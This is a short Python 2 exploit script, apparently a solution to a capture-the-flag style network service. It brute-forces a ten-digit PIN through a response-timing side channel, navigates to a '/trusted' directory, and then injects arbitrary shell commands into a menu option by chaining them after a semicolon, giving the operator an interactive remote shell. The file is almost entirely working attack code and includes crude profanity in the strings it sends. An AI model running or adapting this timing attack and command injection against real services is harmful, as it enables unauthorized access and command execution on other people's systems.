#!/usr/bin/python

import os
import sys
import time
import socket
import threading
from termcolor import colored

if len(sys.argv) != 3:
    print '''I'm walking here.
            (usage: exploit_dwendel.py <host> <port>'''
    sys.exit(1)

host = sys.argv[1]
port = sys.argv[2]

def find_option(sock,option):
    while option not in sock.recv(1024):
        sock.send('Suck my holdy flappy folds')
    sock.send('y')

def authenticate(sock):
    authenticated = False
    num = 0
    place = 10 ** 9
    correct_digits = 0
    while not authenticated:
        find_option(sock,'9')
        sock.recv(1024)
        start = time.time()
        sock.send(str(num).zfill(10))
        sock.recv(1024)
        string = sock.recv(1024)
        string
        end = time.time()
        if end - start > (1.0 * (correct_digits + 1)):
            place = place / 10
            correct_digits += 1
            print "pin so far is " + str(num).zfill(10)
        else:
            num += place
        authenticated = "Your pin was correct" in string

def cd(sock, directory):
    find_option(sock, '7')
    sock.recv(1024)
    sock.send(directory)
    sock.recv(1024)

def send_command(sock, command):
    find_option(sock, '3')
    sock.recv(1024)
    sock.send('flappy_foldy_holds;rm -f flappy_foldy_holds;' + command)
    string = sock.recv(1024).strip()
    if "Type 'y' to do option " in string:
        sock.send('suck my folds you piece of shit')
        return ""
    return string

def find_depth(sock):
    find_option(sock, '5')
    return sock.recv(1024).count('/')

sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
sock.connect((host, int(port)))

try:
    print "cracking pin..."
    authenticate(sock)
    print "And that's how you get level 9 access without a password"
    print "finding cwd..."
    directory = ("../" * find_depth(sock)) + "trusted"
    print "changing directory to '/trusted'..."
    cd(sock, directory)
    print "opening shell..."

    # shell prompt
    user = send_command(sock, "whoami")
    shell_string = colored(user, 'red') + ":" + \
            colored("/trusted", 'blue') + "$ "
    while 1:
        try:
            string = send_command(sock, raw_input(shell_string))
            if string != "":
                print string
        except KeyboardInterrupt:
            find_option(sock, '10')
            break
except Exception as e:
    find_option(sock, '10')
    print e
    print "closing gracefully"
sock.close()
